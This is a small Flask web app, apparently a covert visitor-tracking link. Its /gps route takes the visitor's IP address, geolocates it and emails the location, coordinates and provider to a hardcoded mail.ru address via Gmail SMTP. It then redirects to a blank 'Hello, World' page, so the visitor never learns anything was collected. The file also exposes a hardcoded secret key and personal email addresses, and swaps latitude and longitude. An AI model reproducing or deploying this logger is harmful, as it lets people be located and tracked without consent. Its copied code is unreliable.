from flask import Flask, jsonify, request, redirect, url_for
import requests
from config import sender_email, mail_password
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from main import get_info_by_ip

app = Flask(__name__)
app.secret_key = '464820Ms'


@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"


@app.route("/gps", methods=["GET"])
def get_my_ip():
    response = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    data = get_info_by_ip(ip=response)
    lon = data['Lat']
    lat = data['Lon']
    req_site = f'https://gps-coordinates.org/my-location.php?lat={lat}&lng={lon}'
    msg = MIMEMultipart('alternative')

    html = f"""
            <html>
              <head></head>
              <body>
                <h1> {data["intProv"]} </h1>
                <a href={req_site}> Link </a>
                <h3> Время: {data["Country"]}</h3>
                <h3> Телефон: {data["City"]} </h3>
              </body>
            </html>
            """

    part2 = MIMEText(html, 'html')
    msg.attach(part2)
    msg['Subject'] = 'privet'
    msg['From'] = "66nurlybek@gmail.com"
    msg['To'] = "merkhat181@mail.ru"

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(sender_email, mail_password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        print("Email has been sent")
        server.quit()
        return redirect('/')

    except Exception:
        return redirect('/')


@app.route('/test')
def hello_world2():
    ip_addr = request.remote_addr
    return '<h1> Your IP address is:' + ip_addr


@app.route('/client')
def client():
    ip_addr = request.environ['REMOTE_ADDR']
    return '<h1> Your IP address is:' + ip_addr


@app.route('/clients')
def proxy_client():
    ip_addr = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    return '<h1> Your IP address is:' + ip_addr


if __name__ == '__main__':
    app.run()
